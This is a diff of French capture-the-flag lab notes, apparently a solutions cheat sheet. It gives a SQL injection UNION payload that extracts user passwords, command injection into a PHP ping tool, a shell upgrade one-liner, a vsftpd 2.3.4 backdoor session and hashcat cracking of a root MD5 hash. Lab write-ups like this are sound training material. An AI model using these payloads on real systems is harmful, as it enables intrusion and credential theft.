@@ -23,12 +23,14 @@ Mais on est login en tant que "admin", pas l'autre user !
 SELECT * FROM data.users WHERE username = "a" AND password="" UNION SELECT 1,password as username,2 FROM data.users WHERE username!="admin"
 
 * Solution :
+
     Mettre en user : (n'importe quoi)
     Mettre en mdp : " UNION SELECT 1,password as username,2 FROM data.users WHERE username!="admin
 
 # RCE PHP - Ping
 
 * Solution :
+
     ;ls
     ;whoami
 
@@ -43,6 +45,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")';
 # vstfp:2.3.4 backdoor
 
 * Solution :
+
     ftp 10.1.0.188
     Connected to 10.1.0.188.
     220 (vsFTPd 2.3.4)
@@ -80,5 +83,6 @@ Pense-bête pour le mdp root de l'autre machine:
 dc15d3f5ab9656bc55f7a2f5d1e3a0a5
 
 * Solution :
+
     hashcat -m0 -O flag /usr/share/wordlists/rockyou.txt
     (hashcat -m0 --show flag)
